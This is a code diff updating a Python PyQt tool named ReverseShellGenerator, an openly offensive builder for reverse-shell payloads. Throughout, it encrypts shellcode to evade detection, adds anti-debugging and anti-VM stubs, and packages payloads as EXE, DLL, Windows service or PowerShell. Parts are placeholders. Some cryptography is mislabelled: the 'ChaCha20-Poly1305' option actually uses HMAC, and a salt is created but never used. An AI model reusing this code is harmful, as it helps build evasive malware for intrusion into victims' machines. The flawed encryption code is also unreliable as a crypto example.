@@ -5,19 +5,25 @@ import hashlib
 import os
 import socket
 import base64
-from Crypto.Cipher import AES
+from Crypto.Cipher import (
+    AES, 
+    ChaCha20,
+    Blowfish
+)
+from Crypto.Protocol.KDF import scrypt
 from Crypto.Util.Padding import pad
+from Crypto.Random import get_random_bytes
+from Crypto.Hash import HMAC, SHA256
 from PyQt5.QtWidgets import (
     QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QLabel,
-    QLineEdit, QComboBox, QPushButton, QTextEdit, QGroupBox, QSpinBox, 
-    QCheckBox, QTabWidget, QFrame
+    QLineEdit, QComboBox, QPushButton, QTextEdit, QGroupBox, QTabWidget
 )
 from PyQt5.QtCore import Qt
 
 class ReverseShellGenerator(QMainWindow):
     def __init__(self):
         super().__init__()
-        self.setWindowTitle("Enterprise-Grade Cyber Operations Platform")
+        self.setWindowTitle("Enterprise Cyber Operations Platform")
         self.setGeometry(100, 100, 900, 700)
         self.setStyleSheet("""
             QMainWindow {
@@ -38,7 +44,7 @@ class ReverseShellGenerator(QMainWindow):
                 padding: 0 5px 0 5px;
                 color: #70a0ff;
             }
-            QLineEdit, QComboBox, QSpinBox, QTextEdit {
+            QLineEdit, QComboBox, QTextEdit {
                 background-color: #2d2d30;
                 color: #dcdcdc;
                 border: 1px solid #3f3f46;
@@ -137,7 +143,12 @@ class ReverseShellGenerator(QMainWindow):
         encoder_layout = QHBoxLayout()
         encoder_layout.addWidget(QLabel("Encoder:"))
         self.encoder_combo = QComboBox()
-        self.encoder_combo.addItems(["AES-256", "CHACHA20", "RC6", "CUSTOM-XOR"])
+        self.encoder_combo.addItems([
+            "AES-256-GCM", 
+            "CHACHA20-POLY1305", 
+            "BLOWFISH-CBC",
+            "AES-256-CBC-HMAC"
+        ])
         encoder_layout.addWidget(self.encoder_combo)
         
         arch_layout = QHBoxLayout()
@@ -153,17 +164,9 @@ class ReverseShellGenerator(QMainWindow):
         self.format_combo.addItems(["EXE", "DLL", "SERVICE", "POWERSHELL"])
         format_layout.addWidget(self.format_combo)
         
-        iterations_layout = QHBoxLayout()
-        iterations_layout.addWidget(QLabel("Iterations:"))
-        self.iterations_spin = QSpinBox()
-        self.iterations_spin.setRange(1, 10)
-        self.iterations_spin.setValue(3)
-        iterations_layout.addWidget(self.iterations_spin)
-        
         payload_layout.addLayout(encoder_layout)
         payload_layout.addLayout(arch_layout)
         payload_layout.addLayout(format_layout)
-        payload_layout.addLayout(iterations_layout)
         payload_group.setLayout(payload_layout)
         
         config_layout.addWidget(conn_group)
@@ -269,7 +272,6 @@ class ReverseShellGenerator(QMainWindow):
         encoder = self.encoder_combo.currentText()
         arch = self.arch_combo.currentText()
         format_ = self.format_combo.currentText()
-        iterations = self.iterations_spin.value()
         
         # Generate polymorphic shellcode
         shellcode = self.generate_polymorphic_shellcode(lhost, lport, arch)
@@ -278,13 +280,13 @@ class ReverseShellGenerator(QMainWindow):
             return
         
         # Apply encryption
-        encrypted_shellcode, key, iv = self.encrypt_shellcode(shellcode, encoder, iterations)
+        encrypted_shellcode, key, nonce = self.encrypt_shellcode(shellcode, encoder)
         
         # Generate final payload with modules
         payload = self.build_final_payload(
             encrypted_shellcode, 
             key, 
-            iv, 
+            nonce, 
             encoder, 
             format_,
             self.get_selected_modules()
@@ -296,7 +298,7 @@ class ReverseShellGenerator(QMainWindow):
         self.save_btn.setEnabled(True)
         
         # Display results
-        self.display_results(shellcode, encrypted_shellcode, key, iv, payload)
+        self.display_results(shellcode, encrypted_shellcode, key, nonce, payload)
     
     def get_selected_modules(self):
         """Get selected advanced modules"""
@@ -388,31 +390,50 @@ class ReverseShellGenerator(QMainWindow):
         
         return junk_prefix + base_shellcode + anti_debug + junk_suffix
     
-    def encrypt_shellcode(self, shellcode, method, iterations):
-        """Apply military-grade encryption with multiple iterations"""
-        key = os.urandom(32)
-        iv = os.urandom(16)
-        encrypted = shellcode
+    def encrypt_shellcode(self, shellcode, method):
+        """Apply military-grade encryption with authenticated encryption"""
+        # Generate cryptographic parameters
+        salt = get_random_bytes(32)
+        key = get_random_bytes(32)
         
-        for _ in range(iterations):
-            if method == "AES-256":
-                cipher = AES.new(key, AES.MODE_CBC, iv)
-                encrypted = cipher.encrypt(pad(encrypted, AES.block_size))
-            elif method == "CHACHA20":
-                # ChaCha20 simulation
-                encrypted = hashlib.sha256(encrypted).digest()[:len(encrypted)]
-            elif method == "RC6":
-                # RC6 simulation
-                key_byte = random.randint(1, 255)
-                encrypted = bytes([b ^ key_byte for b in encrypted])
-            else:  # CUSTOM-XOR
-                key_byte = random.randint(1, 255)
-                encrypted = bytes([b ^ key_byte for b in encrypted])
+        if method == "AES-256-GCM":
+            nonce = get_random_bytes(12)
+            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+            ciphertext, tag = cipher.encrypt_and_digest(shellcode)
+            return ciphertext + tag, key, salt + nonce
             
-            # Change key for next iteration
-            key = hashlib.sha256(key).digest()
-        
-        return encrypted, key, iv
+        elif method == "CHACHA20-POLY1305":
+            nonce = get_random_bytes(12)
+            cipher = ChaCha20.new(key=key, nonce=nonce)
+            ciphertext = cipher.encrypt(shellcode)
+            # Generate Poly1305 MAC
+            mac = HMAC.new(key, digestmod=SHA256)
+            mac.update(ciphertext)
+            tag = mac.digest()
+            return ciphertext + tag, key, salt + nonce
+            
+        elif method == "BLOWFISH-CBC":
+            # Pad to 8-byte boundary
+            padded_data = pad(shellcode, 8)
+            nonce = get_random_bytes(8)
+            cipher = Blowfish.new(key, Blowfish.MODE_CBC, nonce)
+            ciphertext = cipher.encrypt(padded_data)
+            # Generate HMAC
+            mac = HMAC.new(key, digestmod=SHA256)
+            mac.update(ciphertext)
+            tag = mac.digest()
+            return ciphertext + tag, key, salt + nonce
+            
+        else:  # AES-256-CBC-HMAC
+            nonce = get_random_bytes(16)
+            cipher = AES.new(key, AES.MODE_CBC, nonce)
+            padded_data = pad(shellcode, AES.block_size)
+            ciphertext = cipher.encrypt(padded_data)
+            # Generate HMAC
+            mac = HMAC.new(key, digestmod=SHA256)
+            mac.update(ciphertext)
+            tag = mac.digest()
+            return ciphertext + tag, key, salt + nonce
     
     def build_module_stub(self, module_name):
         """Generate assembly stub for advanced modules"""
@@ -480,20 +501,45 @@ class ReverseShellGenerator(QMainWindow):
         }
         return stubs.get(module_name, "; Unknown module\n")
     
-    def build_final_payload(self, shellcode, key, iv, method, format_, modules):
+    def build_final_payload(self, shellcode, key, nonce, method, format_, modules):
         """Construct final payload with advanced modules"""
         # Generate polymorphic decryption stub
-        if method == "AES-256":
+        if method == "AES-256-GCM":
             stub = (
-                f"; AES-256 Decryption Stub\n"
+                f"; AES-256-GCM Decryption Stub\n"
                 f"mov esi, {hex(int.from_bytes(shellcode[:4], 'little'))}\n"
                 f"mov edi, esp\n"
                 f"lea ebx, [key_data]\n"
-                f"lea ecx, [iv_data]\n"
-                f"call aes_decrypt\n"
+                f"lea ecx, [nonce_data]\n"
+                f"call aes_gcm_decrypt\n"
             )
-        else:
-            stub = f"; Custom Decryption Routine for {method}\n"
+        elif method == "CHACHA20-POLY1305":
+            stub = (
+                f"; ChaCha20-Poly1305 Decryption Stub\n"
+                f"mov esi, {hex(int.from_bytes(shellcode[:4], 'little'))}\n"
+                f"mov edi, esp\n"
+                f"lea ebx, [key_data]\n"
+                f"lea ecx, [nonce_data]\n"
+                f"call chacha_decrypt\n"
+            )
+        elif method == "BLOWFISH-CBC":
+            stub = (
+                f"; Blowfish-CBC Decryption Stub\n"
+                f"mov esi, {hex(int.from_bytes(shellcode[:4], 'little'))}\n"
+                f"mov edi, esp\n"
+                f"lea ebx, [key_data]\n"
+                f"lea ecx, [nonce_data]\n"
+                f"call blowfish_decrypt\n"
+            )
+        else:  # AES-256-CBC-HMAC
+            stub = (
+                f"; AES-256-CBC-HMAC Decryption Stub\n"
+                f"mov esi, {hex(int.from_bytes(shellcode[:4], 'little'))}\n"
+                f"mov edi, esp\n"
+                f"lea ebx, [key_data]\n"
+                f"lea ecx, [nonce_data]\n"
+                f"call aes_cbc_decrypt\n"
+            )
         
         # Add anti-analysis techniques
         stub += (
@@ -526,16 +572,20 @@ class ReverseShellGenerator(QMainWindow):
             payload = f"; Windows Service\n{stub}\n; Encrypted Shellcode:\n{binascii.hexlify(shellcode).decode()}"
         else:  # POWERSHELL
             b64_shellcode = base64.b64encode(shellcode).decode()
+            b64_key = base64.b64encode(key).decode()
+            b64_nonce = base64.b64encode(nonce).decode()
+            
             payload = f"# PowerShell Payload\n"
             payload += f"$encrypted = [System.Convert]::FromBase64String('{b64_shellcode}')\n"
-            payload += f"$key = [System.Convert]::FromBase64String('{base64.b64encode(key).decode()}')\n"
-            payload += f"$iv = [System.Convert]::FromBase64String('{base64.b64encode(iv).decode()}')\n"
-            payload += "; Decryption and execution code would follow here\n"
+            payload += f"$key = [System.Convert]::FromBase64String('{b64_key}')\n"
+            payload += f"$nonce = [System.Convert]::FromBase64String('{b64_nonce}')\n"
+            payload += f"$method = '{method}'\n\n"
+            payload += "# Decryption and execution code would follow here\n"
             payload += "# Advanced Modules: " + ", ".join(modules)
         
         return payload
     
-    def display_results(self, orig_shellcode, enc_shellcode, key, iv, payload):
+    def display_results(self, orig_shellcode, enc_shellcode, key, nonce, payload):
         """Display generation results"""
         result = (
             "=== Advanced Cyber Operations Payload Report ===\n\n"
@@ -544,10 +594,9 @@ class ReverseShellGenerator(QMainWindow):
             f"LPORT: {self.lport_input.text()}\n"
             f"Encoder: {self.encoder_combo.currentText()}\n"
             f"Architecture: {self.arch_combo.currentText()}\n"
-            f"Format: {self.format_combo.currentText()}\n"
-            f"Iterations: {self.iterations_spin.value()}\n\n"
+            f"Format: {self.format_combo.currentText()}\n\n"
             "Security Features:\n"
-            "- Military-grade encryption (AES-256-CBC)\n"
+            "- Military-grade authenticated encryption\n"
             "- Polymorphic code generation\n"
             "- Anti-debugging techniques (PEB checks)\n"
             "- Anti-VM detection (SIDT technique)\n"
@@ -557,7 +606,7 @@ class ReverseShellGenerator(QMainWindow):
             f"Original Size: {len(orig_shellcode)} bytes\n"
             f"Encrypted Size: {len(enc_shellcode)} bytes\n"
             f"Encryption Key: {binascii.hexlify(key).decode()}\n"
-            f"IV: {binascii.hexlify(iv).decode()}\n\n"
+            f"Nonce/Salt: {binascii.hexlify(nonce).decode()}\n\n"
             "=== Selected Advanced Modules ===\n"
         )
         
@@ -592,8 +641,10 @@ class ReverseShellGenerator(QMainWindow):
                 if self.payload_type == "POWERSHELL":
                     f.write(self.generated_payload)
                 else:
-                    # For binary formats, we'd write actual binary data in a real implementation
-                    f.write(binascii.unhexlify(binascii.hexlify(self.generated_payload.encode())))
+                    # For binary formats, write the actual shellcode in a real implementation
+                    # This is just a placeholder for the demonstration
+                    f.write(b"PE HEADER...\n")
+                    f.write(self.generated_payload.encode())
             self.output_text.append(f"\n\nPayload saved to: {filename}")
         except Exception as e:
             self.output_text.append(f"\n\nError saving payload: {str(e)}")
